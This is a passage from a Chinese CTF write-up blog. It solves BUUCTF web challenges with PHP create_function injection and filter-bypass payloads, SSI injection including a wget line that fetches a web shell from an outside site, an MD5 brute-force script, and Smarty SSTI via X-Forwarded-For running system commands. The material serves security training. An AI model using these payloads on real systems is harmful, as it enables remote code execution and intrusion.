<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210121141285.png" srcset="/img/loading.gif" alt="image-20201210121141285"></p>
<p>继续学习读文件的姿势。</p>
<p>虽然得到了一个新的文件，但我们依然可以用get_defined_vars读取变量的值。只要把rea1fl4g.php包含进来就可以达成目的。</p>
<p>由于include,单双引号, . 还有一些flag关键词都被过滤，用base64编码即可绕过。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>cmVhMWZsNGcucGhw<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//rea1fl4g.php</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php">debu<span class="token operator">=</span>debu_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</span>

<span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%62%61%73%65%36%34_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</span></code></pre>
<p>相似的，还有很多种方法：</p>
<p>比如可以用异或：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token comment" spellcheck="true">//Author: 颖奇L'Amore</span>
<span class="token comment" spellcheck="true">//Blog: www.gem-love.com</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"r e a 1 f l 4 g . p h p"</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">"^"</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"%ff"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span></code></pre>
<p>也可以用取反：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token comment" spellcheck="true">//Author: 颖奇L'Amore</span>
<span class="token comment" spellcheck="true">//Blog: www.gem-love.com</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"r e a 1 f l 4 g . p h p"</span><span class="token punctuation">;</span>
<span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br>~("</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr1</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">")&lt;br>"</span><span class="token punctuation">;</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));var_dump(get_defined_vars());//</span></code></pre>
<hr>
<p>但是！以上都是原题中的做法！这道题过滤了^,异或用不得。而且即使你用取反读到了，哈哈没想到吧还是假flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210135159843.png" srcset="/img/loading.gif" alt="image-20201210135159843"></p>
<h2 id="方法一-利用require本地包含"><a href="#方法一-利用require本地包含" class="headerlink" title="方法一  利用require本地包含"></a><strong>方法一  利用require本地包含</strong></h2><p>正解是require里套个编码过的伪协议。也就是用require()本地包含加伪协议读源码。</p>
<p>最终payload:</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>aqua_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//</span>
<span class="token operator">--</span><span class="token operator">></span>编码
<span class="token operator">?</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210134954382.png" srcset="/img/loading.gif" alt="image-20201210134954382"></p>
<h2 id="方法二-define-fopen-fgets"><a href="#方法二-define-fopen-fgets" class="headerlink" title="方法二 define+fopen ()+fgets ()"></a>方法二 define+fopen ()+fgets ()</h2><p>fopen()和fgets()都没被过滤，但$被ban了。这里直接用define定义了个常量，学到了学到了。</p>
<p>payload</p>
<pre><code>define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);</code></pre><h2 id="方法三-数组操作"><a href="#方法三-数组操作" class="headerlink" title="方法三 数组操作"></a>方法三 数组操作</h2><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210151809955.png" srcset="/img/loading.gif" alt="image-20201210151809955"></p>
<pre class=" language-php"><code class="language-php">flag<span class="token punctuation">[</span>arg<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;flag[code]=create_function&amp;abc=php://filter/convert.base64-encode/resource=rea1fl4g.php</span>

post<span class="token punctuation">:</span>
abc<span class="token operator">=</span><span class="token number">1</span></code></pre>
<p>师傅的wp说的很清晰了。</p>
<p>同理，还有这种</p>
<pre><code>rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;flag[arg]=;}require(get_defined_vars()[_GET][rce]);//</code></pre><blockquote>
<p>参考：<a href="https://www.gem-love.com/ctf/770.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/770.html</a></p>
</blockquote>
<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>考点：vim泄露；爆破；SSI注入。</p>
<p>一个简单的登录页面，输入错误只会弹failed。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210162622123.png" srcset="/img/loading.gif" alt="image-20201210162622123"></p>
<p>扫了下后台，vim泄露，访问得到源码。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210162435387.png" srcset="/img/loading.gif" alt="image-20201210162435387"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>
            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$text</span> <span class="token operator">=</span> '
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span><span class="token keyword">else</span>
    <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token delimiter">?></span></code></pre>
<p>admin的值是6d0bc1，爆个破找个passwd出来。结果是2020666。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> threading

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"6d0bc1"</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">)</span>
thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>登录进来了，一开始以为啥都没有。结果这有个header的提示。那估计是头里有东西。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170558095.png" srcset="/img/loading.gif" alt="image-20201210170558095"></p>
<p>果然 Url_is_here: public/372fda1bdfbe9027365d54258d00222630c2af50.shtml</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170640569.png" srcset="/img/loading.gif" alt="image-20201210170640569"></p>
<p>访问一下。再回头看这段源码。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170848312.png" srcset="/img/loading.gif" alt="image-20201210170848312"></p>
<p>这里实际上对username没有要求，并且它可控。诶, html+rce=ssi。</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>
            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$text</span> <span class="token operator">=</span> '
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span></code></pre>
<p>那么传入</p>
<p>username=<!--#exec cmd="ls /" --></p>
<p>passwd=2020666</p>
<p>再访问如下的url,rce成功。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174108354.png" srcset="/img/loading.gif" alt="image-20201210174108354"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174142583.png" srcset="/img/loading.gif" alt="image-20201210174142583"></p>
<p>找了找，在../下。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174356471.png" srcset="/img/loading.gif" alt="image-20201210174356471"></p>
<p>payload</p>
<pre><code>username=%3C%21--%23exec+cmd%3D%22cat%20../flag_990c66bf85a09c664f0b6741840499b2%22+--%3E&amp;password=2020666</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174544128.png" srcset="/img/loading.gif" alt="image-20201210174544128"></p>
<h2 id="SSI注入总结"><a href="#SSI注入总结" class="headerlink" title="SSI注入总结"></a>SSI注入总结</h2><p>SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。</p>
<p><strong>前提条件</strong></p>
<p>1.开启SSI</p>
<p>2.WEB应用程序返回HTML界面时，嵌入用户输入的内容。</p>
<p>3.对用户输入没有有效过滤。</p>
<p><strong>命令执行</strong></p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="ls" --></span></code></pre>
<p><strong>脚本</strong></p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --></span></code></pre>
<p><strong>访问/设置服务器信息</strong> </p>
<p>更改错误消息输出：</p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#config errmsg="File not found, informs users and password"--></span></code></pre>
<p>显示当前文档的文件名：</p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_NAME" --></span></code></pre>
<p>显示虚拟路径和文件名：</p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_URI" --></span></code></pre>
<p>使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：</p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#config timefmt="A %B %d %Y %r"--></span></code></pre>
<p>使用“ fsize”命令，可以打印所选文件的大小：</p>
<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#fsize file="ssi.shtml" --></span></code></pre>
<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p><strong>考点：smarty ssti</strong></p>
<p>..这一整页英文..看着就头疼，但还好有个smarty的提示。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210190110082.png" srcset="/img/loading.gif" alt="image-20201210190110082"></p>
<p>源代码看见，版本smarty3-&gt;ssti</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210190506686.png" srcset="/img/loading.gif" alt="image-20201210190506686"></p>
<p>各个参数里都尝试一下，找到xff中存在ssti。(他这页面估计也是在提示这里)</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210191946987.png" srcset="/img/loading.gif" alt="image-20201210191946987"></p>
<p>payload</p>
<pre><code>X-Forwarded-For:{if phpinfo()}{/if}
X-Forwarded-For:{if system(&quot;ls /&quot;)}{/if}
X-Forwarded-For:{if system(&quot;cat /flag&quot;)}{/if}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192059868.png" srcset="/img/loading.gif" alt="image-20201210192059868"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192329246.png" srcset="/img/loading.gif" alt="image-20201210192329246">)<img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192403413.png" srcset="/img/loading.gif" alt="image-20201210192403413"></p>
<h2 id="Smarty-SSTI-利用方式"><a href="#Smarty-SSTI-利用方式" class="headerlink" title="Smarty SSTI 利用方式"></a>Smarty SSTI 利用方式</h2><p><strong>常规利用方式</strong></p>
<p>1.{literal} 标签</p>
<pre><code>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</code></pre><p>那么就可以构造,但此方法仅在php5中适用。</p>
<pre><code>{literal &lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;}{/literal}</code></pre><p>2.{php}标签</p>
<p>官方文档</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<p><strong>静态方法</strong></p>
<p>1.通过self获取Smarty类再调用其静态方法实现文件读写（仅适用于旧版本 &lt;3.1.30(?)）</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
